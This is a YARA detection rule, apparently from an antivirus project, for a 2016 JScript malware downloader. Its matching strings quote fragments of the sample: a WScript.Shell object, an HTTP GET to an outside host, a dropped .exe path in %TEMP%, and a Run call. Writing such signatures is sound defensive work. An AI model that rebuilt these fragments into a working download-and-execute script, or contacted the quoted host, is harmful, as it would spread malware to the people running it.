rule sig_20160329_978e331b254dd6b6399bb5dad09227fa {
  meta:
    description = "datamaliciousorder - file 20160329_978e331b254dd6b6399bb5dad09227fa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4fc9742d3d4fd52232ff4857afe45a16f299688bf370959456d8a4478ee5092d"

  strings:
    $s1  = "function Hdekr() {return Fducuilqdw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WO2snc6XUL4WSA4p.exe\";};" fullword ascii
    $s2  = "do {WScript[Kcrmjytt](Xxeubi() * 11)} while (Htknn[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Htknn[Jxnvkyx](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Xlqjdlssa(Kzgmi, Nwubf){return Kzgmi - Nwubf;};" fullword ascii
    $s5  = "var Fducuilqdw = function Qkfnjajvwv() {return WScript[Kqfimeh](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Eqkajskqmc(Ttqtng){Fducuilqdw[\"Run\"](Ttqtng, Lcffxc, Lcffxc);};" fullword ascii
    $s7  = "function Hjezzoemkw() {return ((Vndxqiedp == true) && (Vndxqiedp == Ewsuu)) ? 1 : Lcffxc;};" fullword ascii
    $s8  = "Vndxqiedp = true; " fullword ascii
    $s9  = " while (Kcnkno){" fullword ascii
    $s10 = "function Mxoxlvu(){return Yshbvvnk;};" fullword ascii
    $s11 = "var Otgplkqh = new this[\"Date\"]();" fullword ascii
    $s12 = "var Qlbiyizkd = false;" fullword ascii
    $s13 = "var Vndxqiedp = false;" fullword ascii
    $s14 = "function Hldog()" fullword ascii
    $s15 = "var Ewsuu = false;" fullword ascii
    $s16 = "return Xlqjdlssa(Pwvpqomv, Ipyqfpqva);" fullword ascii
    $s17 = "Ewsuu = true; " fullword ascii
    $s18 = "function Xxeubi(){return 22;};" fullword ascii
    $s19 = "function Kwdfkprkkg(){return Kqfimeh;};" fullword ascii
    $s20 = "} catch(Gujwdm){Kcnkno = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}